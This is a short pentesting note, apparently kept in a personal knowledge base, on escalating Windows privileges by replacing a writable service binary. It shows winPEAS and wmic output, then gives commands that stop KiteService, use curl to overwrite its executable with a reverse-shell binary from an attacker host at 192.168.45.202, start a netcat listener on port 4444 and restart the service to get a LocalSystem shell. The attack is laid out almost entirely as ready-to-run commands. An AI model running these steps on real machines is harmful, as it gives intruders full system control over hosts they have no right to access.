public:: true

- If [[winPEAS]] tells you that there are services ran by privileged users for which you can swap the called binary and then restart the service.
- WinPEAS returns something like this
  ```
  [...]
  Installed Applications --Via Program Files/Uninstall registry--
  Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
      C:\Program Files\Common Files
      C:\Program Files\desktop.ini
      C:\Program Files\FreeSWITCH(chris [AllAccess])
      C:\Program Files\Internet Explorer
      C:\Program Files\Kite(chris [WriteData/CreateFiles])
  	[...]
  ```
- Get a list of services along with users who ran them and the pathname of the file executed
  ```cmd
  > wmic service get name,startname,pathname,state
  [...]
  KiteService	C:\program files\Kite\KiteService.exe	LocalSystem	Running
  [...]
  ```
- Stop the service
  ```powershell
  stop-service -name kiteservice
  ```
- Swap the binary with a reverse shell
  ```powershell
  curl "http://192.168.45.202:8000/rev_cmd_4444.exe" -o "C:\program files\Kite\KiteService.exe"
  ```
- Start a listener on Kali on port *4444*
  ```bash
  > rlwrap nc -lnvp 4444
  ```
- Start the service
  ```powershell
  start-service -name kiteservice
  ```